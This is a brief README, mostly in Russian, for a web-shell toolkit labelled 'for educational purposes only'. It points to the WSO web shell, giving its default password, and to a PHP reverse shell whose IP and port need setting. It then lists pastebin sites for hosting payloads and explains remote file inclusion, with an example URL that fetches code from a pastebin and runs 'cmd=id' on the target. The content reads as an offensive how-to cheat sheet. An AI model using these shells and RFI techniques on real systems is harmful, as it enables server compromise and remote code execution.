# web_shells For educational purposes only!

## wso shell 
repo - https://github.com/mIcHyAmRaNe/wso-webshell
Пароль по умолчанию - ghost287 (поменять пароль можно в строке 7 указав md5 хеш нового пароля)

## rev-shell 
repo - https://github.com/pentestmonkey/php-reverse-shell/tree/master
Не забудьте указать новый IP и PORT на строке 49 и 50

## pastebin like services
Список сервисов для публикации кода https://github.com/lorien/awesome-pastebins
Проверенные бесплатные сервисы:
- http://vpaste.net/
- https://bpa.st/
- https://pastebin.mozilla.org/
- https://paste.debian.net/
- https://pastebin.fi/

После размещения ищем кнопку RAW и получаем ссылку на текст файла, который уже можно использовать для RFI\RCE
P.S. При работе с RFI не забывайте, что вы передаёте ссылку как параметр, и если внутри вашего кода тоже есть обработчик параметра, то его нужно передавать не через ?, а через &


🚫 BAD - http://127.0.0.1/test.php?page=https://pastebin.fi/r/lolkek?cmd=id 

🆗 GOOD - http://127.0.0.1/test.php?page=https://pastebin.fi/r/lolkek&cmd=id 
